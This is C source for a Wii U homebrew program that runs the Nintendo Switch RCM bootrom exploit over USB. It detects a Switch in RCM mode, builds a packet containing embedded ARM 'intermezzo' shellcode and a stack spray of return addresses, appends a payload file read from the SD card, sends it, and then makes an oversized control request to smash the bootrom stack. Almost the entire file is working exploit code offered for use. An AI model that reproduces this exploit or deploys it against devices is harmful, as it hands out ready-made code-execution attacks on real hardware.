#include <whb/proc.h>
#include <whb/log.h>
#include <whb/log_udp.h>
#include <whb/log_console.h>

#include <string.h>
#include <malloc.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include <nsysuhs/uhs.h>
#include <nsysuhs/uhs_usbspec.h>

#define htole32 __builtin_bswap32

static uint8_t intermezzo_bin[] = {
    0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0, 
    0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1, 
    0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB, 
    0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4, 
    0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40, 
    0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
};

/* Nintendo Switch RCM Mode VID/PID */
#define APX_VID 0x0955
#define APX_PID 0x7321

#define TIMEOUT 1000 // milliseconds

#define MAX_LENGTH          0x30298 // length of the exploit packet
#define RCM_PAYLOAD_ADDR    0x40010000
#define INTERMEZZO_LOCATION 0x4001F000
#define PAYLOAD_LOAD_BLOCK  0x40020000
#define SEND_CHUNK_SIZE     0x1000
#define NUM_URB_BUFS        5 // queing max 5 bufs should be more than enough

UhsHandle handle = {};
int if_handle = -1;
bool devReady = false;

void acquire_interface_callback(void* context, int32_t arg1, int32_t arg2)
{
    WHBLogPrintf("acquire_interface_callback");
}

void drv_reg_callback(void* context, UhsInterfaceProfile* profile)
{
    WHBLogPrintf("drv_reg_callback");

    if_handle = profile->if_handle;

    // acquire if
    int res = UhsAcquireInterface(&handle, profile->if_handle, NULL, acquire_interface_callback);
    if (res < 0) {
        WHBLogPrintf("UhsAcquireInterface : %x", res);
        return;
    }

    // enable ep1 in and out
    res = UhsAdministerEndpoint(&handle, if_handle, UHS_ADMIN_EP_ENABLE, 0x20002, NUM_URB_BUFS, SEND_CHUNK_SIZE);
    if (res < 0) {
        WHBLogPrintf("UhsAdministerEndpoint : %x", res);
        UhsReleaseInterface(&handle, if_handle, false);
        if_handle = -1;
        return;
    }

    // inject the payload in the main thread since the callback stack is tiny
    devReady = true;
}

void inject_payload(void)
{
    /* Read the device ID */
    alignas(0x40) uint8_t devid[16];
    int res = UhsSubmitBulkRequest(&handle, if_handle, 1, ENDPOINT_TRANSFER_IN, devid, sizeof(devid), TIMEOUT);
    if (res != sizeof(devid)) {
        WHBLogPrintf("UhsSubmitBulkRequest: %x", res);
        return;
    }

    char ascii_buf[sizeof(devid) * 2 + 1] = "";
    for (int i = 0; i < sizeof(devid); i++) {
        sprintf(ascii_buf + i * 2, "%02x", devid[i]);
    }

    WHBLogPrintf("Device ID: %s", ascii_buf);

    /* Begin payload construction */
    uint32_t payload_idx = 0;
    char* payload_buf = memalign(0x40, MAX_LENGTH);
    memset(payload_buf, 0, MAX_LENGTH);
    
    *(uint32_t*) payload_buf = htole32(MAX_LENGTH);
    payload_idx	= 0x2a8; // skip over the header
    
    /* fill the stack with the intermezzo address */
    for (int i = RCM_PAYLOAD_ADDR; i < INTERMEZZO_LOCATION; i += 4, payload_idx += 4)
        *(uint32_t*) &payload_buf[payload_idx] = htole32(INTERMEZZO_LOCATION);
    
    /* load intermezzo.bin */
    memcpy(&payload_buf[payload_idx], intermezzo_bin, sizeof(intermezzo_bin));
    
    /* pad until payload */
    payload_idx += PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION;
    
    FILE* payload_file;
    /* load the actual payload */
    if ((payload_file = fopen("/vol/external01/nxpayload.bin", "r")) == NULL) {
        WHBLogPrintf("Failed to open nxpayload.bin!");
        return;
    }

    int file_len = fread(&payload_buf[payload_idx], 1, MAX_LENGTH-payload_idx, payload_file);
    payload_idx += file_len;
    fclose(payload_file);
    WHBLogPrintf("Read %d bytes", file_len);
    if (payload_idx == MAX_LENGTH)
        WHBLogPrintf("Warning: payload may have been truncated. Continuing.");

    /* Send the payload */
    uint32_t payload_len = payload_idx;
    int low_buffer = 1;
    for (payload_idx = 0; payload_idx < payload_len || low_buffer; payload_idx += SEND_CHUNK_SIZE, low_buffer ^= 1) {
        res = UhsSubmitBulkRequest(&handle, if_handle, 1, ENDPOINT_TRANSFER_OUT, &payload_buf[payload_idx], SEND_CHUNK_SIZE, TIMEOUT);
        if (res != SEND_CHUNK_SIZE) {
            WHBLogPrintf("UhsSubmitBulkRequest : %x\n", res);
            break;
        }

        // make sure we don't submit too many request to overflow NUM_URB_BUFS 
        usleep(2000);
    }	
    WHBLogPrintf("Sent 0x%x bytes", payload_idx);

    free(payload_buf);

    /* Smash the stack! */
    void* buf = memalign(0x40, 0x7000);
    memset(buf, 0, 0x7000);

    // this will return an error since not all 0x7000 bytes can be written, but it still works
    res = UhsSubmitControlRequest(&handle, if_handle, buf, 0, 0x82, 0, 0, 0x7000, TIMEOUT);
    WHBLogPrintf("Smashed the stack: %x\n", res);

    free(buf);
}

int main(int argc, char const *argv[])
{
    int class_drv = -1;

    WHBProcInit();
    //WHBLogUdpInit();
    WHBLogConsoleInit();

    UhsConfig conf = {};
    conf.buffer = memalign(0x40, UHS_CONFIG_BUFFER_SIZE);
    conf.buffer_size = UHS_CONFIG_BUFFER_SIZE;
    conf.controller_num = 0;

    int res = UhsClientOpen(&handle, &conf);
    if (res < 0) {
        WHBLogPrintf("UhsClientOpen : %x", res);
        goto loop;
    }

    UhsInterfaceFilter filter = {};
    filter.vid = APX_VID;
    filter.pid = APX_PID;
    filter.match_params = MATCH_DEV_VID | MATCH_DEV_PID;

    class_drv = UhsClassDrvReg(&handle, &filter, NULL, drv_reg_callback);
    if (class_drv < 0) {
        WHBLogPrintf("UhsClassDrvReg : %x", class_drv);
        goto loop;
    }

    WHBLogPrintf("Waiting for device...");

loop: ;
    while (WHBProcIsRunning()) {
        if (devReady) {
            inject_payload();
            UhsReleaseInterface(&handle, if_handle, false);
            if_handle = -1;
            devReady = false;

            WHBLogPrintf("Waiting for device...");
        }

        WHBLogConsoleDraw();
    }

    if (if_handle != -1) {
        UhsReleaseInterface(&handle, if_handle, false);
    }

    if (class_drv != -1) {
        UhsClassDrvUnReg(&handle, class_drv);
    }

    UhsClientClose(&handle);

    free(conf.buffer);

    WHBLogConsoleFree();
    //WHBLogUdpDeinit();
    WHBProcShutdown();
    return 0;
}
